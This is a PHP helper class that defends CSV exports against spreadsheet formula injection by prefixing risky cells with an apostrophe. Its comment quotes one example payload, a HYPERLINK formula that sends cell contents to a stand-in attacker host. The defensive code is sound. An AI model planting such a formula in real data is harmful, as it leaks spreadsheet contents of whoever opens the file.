<?php

declare(strict_types=1);

namespace App\Support;

/**
 * CSV cell hardening against formula (a.k.a. CSV / DDE) injection.
 *
 * fputcsv() quotes commas, quotes and newlines correctly, but it does nothing
 * about spreadsheet formulas. A cell whose value begins with =, +, -, @, or a
 * tab / carriage return is interpreted as a formula when the file is opened in
 * Excel, Google Sheets or LibreOffice. Because contacts here can be created by
 * an unauthenticated public form submission, a value like
 *   =HYPERLINK("https://evil.example?x="&A1&A2,"click me")
 * lands in the export and runs on the machine of whoever opens it.
 *
 * The OWASP-recommended defence is to prefix an at-risk value with a single
 * quote, which forces the spreadsheet to treat the whole cell as text. The
 * value round-trips visibly (a leading apostrophe) rather than executing.
 */
final class Csv
{
    private const TRIGGERS = ['=', '+', '-', '@', "\t", "\r"];

    public static function cell(mixed $value): string
    {
        $string = (string) $value;

        if ($string !== '' && in_array($string[0], self::TRIGGERS, true)) {
            return "'".$string;
        }

        return $string;
    }

    /**
     * Guard every cell in a row.
     *
     * @param  array<int, mixed>  $row
     * @return array<int, string>
     */
    public static function row(array $row): array
    {
        return array_map(self::cell(...), $row);
    }
}
